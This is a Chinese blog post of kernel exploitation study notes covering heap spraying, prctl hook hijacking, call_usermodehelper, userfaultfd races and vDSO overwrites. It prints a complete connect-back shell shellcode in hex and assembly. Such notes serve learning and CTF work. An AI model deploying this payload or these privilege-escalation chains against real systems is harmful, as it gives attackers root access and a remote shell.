<h2 id="Technique"><a href="#Technique" class="headerlink" title="Technique"></a>Technique</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3204">从内存任意读写到权限提升</a></p>
<h3 id="堆喷射-Heap-Spray"><a href="#堆喷射-Heap-Spray" class="headerlink" title="堆喷射(Heap Spray)"></a>堆喷射(Heap Spray)</h3><h4 id="固定堆布局"><a href="#固定堆布局" class="headerlink" title="固定堆布局"></a>固定堆布局</h4><p>假设现在有一个堆溢出,但你目标要覆盖的对象不一定会分配到与能够发生溢出的对象前向(高地址)相邻的位置.(由于内核堆操作freelist杂乱或是开启了SLAB_FREELIST_RANDOM保护(默认开启)).<br>ps: 前提在同一个cache中</p>
<p>堆喷射:<br>先大量分配(spray)目标对象,清空原freelist(可选,个人见解).<br>分配发生溢出的对象.<br>大量喷射目标对象,使得目标对象并排放置,且有一个目标对象与发生溢出对象前向相邻.<br>最后正常溢出覆盖目标对象.</p>
<p>比如不断fork出新的进程,喷射cred结构再溢出覆盖完成提权(当然现在行不通了).<br>如何找到cred结构?PR_SET_NAME设置字符串,再在direct映射区搜索内存</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PR_SET_NAME (since Linux 2.6.9)</span><br><span class="line">    Set  the name of the calling thread, using the value in the location pointed to by (char *) arg2.  The name can be up to 16 bytes long, including the terminating null byte.  (If the</span><br><span class="line">    length of the string, including the terminating null byte, exceeds 16 bytes, the string is silently truncated.)  This is the same attribute that can be set via pthread_setname_np(3)</span><br><span class="line">    and retrieved using pthread_getname_np(3).  The attribute is likewise accessible via /proc/self/task/[tid]/comm, where tid is the name of the calling thread.</span><br></pre></td></tr></tbody></table></figure>

<h3 id="HijackPrctl"><a href="#HijackPrctl" class="headerlink" title="HijackPrctl"></a>HijackPrctl</h3><p>《New Reliable Android Kernel Root Exploitation Techniques》</p>
<p>一个内核的hook,且用户态可完整控制参数.<br>注意第一个参数是个int类型,可能不能完整传递64位数据.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(prctl, <span class="type">int</span>, option, <span class="type">unsigned</span> <span class="type">long</span>, arg2, <span class="type">unsigned</span> <span class="type">long</span>, arg3,</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span>, arg4, <span class="type">unsigned</span> <span class="type">long</span>, arg5)</span><br></pre></td></tr></tbody></table></figure>

<blockquote>
<p>这种漏洞利用的原理在dong-hoon you(x86)分享的《New Reliable Android Kernel Root Exploitation Techniques》中提到，这种技术被用于安卓root，可以绕过PXN防御。</p>
<p>首先在用户执行prctl函数时，实际上是将全部参数传递给security_task_prctl函数（\kernel\sys.c 2075）</p>
<p>而security_task_prctl（\security\security.c）中通过hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);将参数原封不动的传入hook进行处理，而这个hook位于内核的data段上，内核态有读写权限，因此可以通过修改这个位置劫持ptctl函数的执行流程：</p>
</blockquote>
<h3 id="call-usermodehelper"><a href="#call-usermodehelper" class="headerlink" title="call_usermodehelper"></a>call_usermodehelper</h3><p>《New Reliable Android Kernel Root Exploitation Techniques》</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">call_usermodehelper</span><span class="params">(<span class="type">char</span> * path, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp, <span class="type">int</span> wait)</span>; </span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>call_usermodehelper，这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令（注意命令中的参数要用全路径，不能用相对路径）。</p>
</blockquote>
<p>由于prctl第一个参数的截断,只能传递(四位的)用户态地址,在开启了SMAP的情况下需要通过这样的链子.</p>
<ol>
<li>mce_do_trigger –&gt; call_usermodehelper<br> <img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311091532153.png"></li>
<li>poweroff_work_func –&gt; run_cmd(poweroff_cmd) –&gt; call_usermodehelper<br> <img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311091545125.png"></li>
</ol>
<h4 id="提权变量总结"><a href="#提权变量总结" class="headerlink" title="提权变量总结"></a>提权变量总结</h4><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a2259cd3e79e">call_usermodehelper提权路径变量总结</a></p>
<h3 id="userfaultfd"><a href="#userfaultfd" class="headerlink" title="userfaultfd"></a>userfaultfd</h3><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253835">从强网杯 2021 线上赛题目 notebook 中浅析 userfaultfd 在 kernel pwn 中的利用</a><br>该技术主要用于条件竞争的控制,本质是利用错误处理来控制条件竞争的时序.linux5.11后需要root才能启用.可用FUSE达到相同效果.</p>
<p>比如这样一个条件竞争完成稳定uaf:<br>一个线程通过blob_get取得对象的读机会,在读的时候触发pagefault,进入错误处理,错误处理线程调用blob_del删除此对象,利用喷射完成堆布局,这个对象现在是一个tty结构,最后恢复执行,blob_get读取到tty结构<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311111519808.png"></p>
<p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311091656940.png"></p>
<h3 id="vDSO"><a href="#vDSO" class="headerlink" title="vDSO"></a>vDSO</h3><p>《Bypassing SMEP Using vDSO Overwrites》</p>
<p>vDSO是虚拟的共享库,实际上是把内核地址空间的某代码段映射到用户空间,修改其中的导出函数如:</p>
<blockquote>
<p>clock_gettime   0000000000000A10<br>gettimeofday    0000000000000C80<br>time    0000000000000DE0<br>getcpu  0000000000000E00<br>start   0000000000000940    [main entry]</p>
</blockquote>
<p>可劫持调用代码的root或suid进程,完成提权(其实本来就是root,只是弹个shell)</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//gist.github.com/itsZN/1ab36391d1849f15b785</span></span><br><span class="line"><span class="string">"\x90\x53\x48\x31\xc0\xb0\x66\x0f\x05\x48\x31\xdb\x48\x39\xc3\x75\x0f\x48\x31\xc0\xb0\x39\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x09\x5b\x48\x31\xc0\xb0\x60\x0f\x05\xc3\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\x48\x97\x50\x48\xb9\xfd\xff\xf2\xfa\x80\xff\xff\xfe\x48\xf7\xd1\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x07\x48\x31\xc0\xb0\xe7\x0f\x05\x90\x6a\x03\x5e\x6a\x21\x58\x48\xff\xce\x0f\x05\x75\xf6\x48\xbb\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd3\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x0f\x05"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nop</span><br><span class="line">push rbx</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al, <span class="number">0x66</span></span><br><span class="line">syscall <span class="meta">#check uid</span></span><br><span class="line">xor rbx,rbx</span><br><span class="line">cmp rbx,rax</span><br><span class="line">jne emulate</span><br><span class="line"></span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,<span class="number">0x39</span></span><br><span class="line">syscall <span class="meta">#fork</span></span><br><span class="line">xor rbx,rbx</span><br><span class="line">cmp rax,rbx</span><br><span class="line">je connectback</span><br><span class="line"></span><br><span class="line">emulate:</span><br><span class="line">pop rbx</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,<span class="number">0x60</span></span><br><span class="line">syscall</span><br><span class="line">retq</span><br><span class="line"></span><br><span class="line">connectback:</span><br><span class="line">xor rdx,rdx</span><br><span class="line">pushq <span class="number">0x1</span></span><br><span class="line">pop rsi</span><br><span class="line">pushq <span class="number">0x2</span></span><br><span class="line">pop rdi</span><br><span class="line">pushq <span class="number">0x29</span></span><br><span class="line">pop rax </span><br><span class="line">syscall <span class="meta">#socket</span></span><br><span class="line"></span><br><span class="line">xchg rdi,rax</span><br><span class="line">push rax</span><br><span class="line">mov rcx, <span class="number">0xfeffff80faf2fffd</span></span><br><span class="line">not rcx</span><br><span class="line">push rcx</span><br><span class="line">mov rsi,rsp</span><br><span class="line">pushq <span class="number">0x10</span></span><br><span class="line">pop rdx</span><br><span class="line">pushq <span class="number">0x2a</span></span><br><span class="line">pop rax</span><br><span class="line">syscall <span class="meta">#connect</span></span><br><span class="line"></span><br><span class="line">xor rbx,rbx</span><br><span class="line">cmp rax,rbx</span><br><span class="line">je sh</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,<span class="number">0xe7</span></span><br><span class="line">syscall <span class="meta">#exit</span></span><br><span class="line"></span><br><span class="line">sh:</span><br><span class="line">nop</span><br><span class="line">pushq <span class="number">0x3</span></span><br><span class="line">pop rsi</span><br><span class="line">duploop:</span><br><span class="line">pushq <span class="number">0x21</span></span><br><span class="line">pop rax</span><br><span class="line">dec rsi</span><br><span class="line">syscall <span class="meta">#dup</span></span><br><span class="line">jne duploop</span><br><span class="line"></span><br><span class="line">mov rbx,<span class="number">0xff978cd091969dd0</span></span><br><span class="line">not rbx</span><br><span class="line">push rbx</span><br><span class="line">mov rdi,rsp</span><br><span class="line">push rax</span><br><span class="line">push rdi</span><br><span class="line">mov rsi,rsp</span><br><span class="line">xor rdx,rdx</span><br><span class="line">mov al,<span class="number">0x3b</span></span><br><span class="line">syscall <span class="meta">#execve</span></span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,<span class="number">0xe7</span></span><br><span class="line">syscall</span><br></pre></td></tr></tbody></table></figure>
<h2 id="参考文章-引文-图片来源"><a href="#参考文章-引文-图片来源" class="headerlink" title="参考文章,引文,图片来源"></a>参考文章,引文,图片来源</h2><p>感谢各位师傅的文章,侵删<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6296">https://xz.aliyun.com/t/6296</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3204">https://xz.aliyun.com/t/3204</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/07994f8b2bb0">https://www.jianshu.com/p/07994f8b2bb0</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a2259cd3e79e">https://www.jianshu.com/p/a2259cd3e79e</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253835">https://www.anquanke.com/post/id/253835</a></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>版权声明： </strong>
          
          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://jamorant12138.github.io/2024/Linux%20Kernel%20Exploit%20Basic--Notes/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/2024/d3ctf-2022%20d3kheap%E4%B8%8ECVE-2021-22555/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            d3ctf-2022 d3kheap与CVE-2021-22555
          
        </div>
      </a>
    
    
      <a href="/2023/ldt_struct-arb_rw%20&&%200CTF2021-kernote/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">ldt_struct 任意地址读写&amp;&amp;0CTF2021-kernote</div>
      </a>
    
  </nav>

  
   
    
    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
    <div id="twikoo" class="twikoo"></div>
    <script>
        twikoo.init({
            envId: ""
        })
    </script>
 
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2022-2024
        <i class="ri-heart-fill heart_icon"></i> 翰青HanQi
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="北极落小雪"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/2022/About">关于</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->
 
<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: ".tocbot",
    contentSelector: ".article-entry",
    headingSelector: "h1, h2, h3, h4, h5, h6",
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: "main",
    positionFixedSelector: ".tocbot",
    positionFixedClass: "is-position-fixed",
    fixedSidebarOffset: "auto",
  });
</script>

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->

<!-- ClickLove -->
 
<script src="/js/clickLove.js"></script>
 
<!-- ClickBoom1 -->

<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->
 
<script src="/js/dz.js"></script>
 
<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</body>

</html>